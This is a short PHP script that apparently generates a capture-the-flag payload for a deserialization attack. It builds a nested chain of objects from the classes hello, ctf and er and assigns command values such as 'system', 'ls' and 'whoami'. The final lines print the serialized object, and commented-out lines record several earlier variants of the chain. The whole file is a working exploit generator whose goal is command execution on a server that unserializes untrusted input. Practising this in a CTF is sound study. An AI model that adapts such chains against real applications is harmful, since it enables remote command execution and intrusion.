<?php
class hello{
    public $hello;
    public $name;
    public $win;

}
class ctf{
    public $ctf;
    public $name;

}
class er{
    public $er;
    public $cmd;

}


//$a= new hello();
//$a->hello = new ctf();
//$a->hello->ctf = new er();
////$a->hello->ctf->cmd = "system";
////$a->hello->name = ["couse"=>"whoami"];
////$a->hello->name = array(["souce"=>"phpinfo()"],"1111");
////$a->hello->name = [['couse' => 'system'], ['ls']];
//$a->hello->name = array(["souce"=>"whoami",'win' => true],"1111");
////unset($a->hello->name->cmd);
////$a->hello->name->cmd = "system";
//$a->hello->ctf->er = new hello();
//$a->hello->ctf->er->win = true;
//$a->hello->ctf->er->name = array(["win"=>true]);


$a = new hello();
$a->hello = new ctf();
$a->win = "true";
$a->hello->ctf = new er();
$a->hello->ctf->name = array(["couse"=>"ls"]);
//$a->hello->ctf->win = true;
$a->hello->ctf->er = new hello();




echo serialize($a);